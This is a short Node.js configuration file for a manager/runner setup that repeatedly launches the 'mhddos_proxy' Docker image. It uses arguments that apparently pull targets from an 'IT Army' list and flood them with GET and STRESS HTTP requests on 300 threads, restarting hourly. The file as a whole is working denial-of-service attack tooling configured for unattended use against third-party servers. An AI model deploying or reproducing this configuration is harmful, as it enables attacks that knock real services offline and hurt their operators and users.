module.exports = {
  manager: {
    httpPort: process.env.HTTP_PORT || 3003,
    wsPort: process.env.WS_PORT || 7071,
  },

  runner: {
    dockerOptions: [
      "--cpus=.5",
      "--pull always",
      "--log-driver none"
    ],
    image: "ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest",
    commandArgs: [
      "--itarmy",
      "--http-methods GET STRESS",
      "-t 300",
      "--copies 1",
    ],
    restartIn: 3600,
  }
}
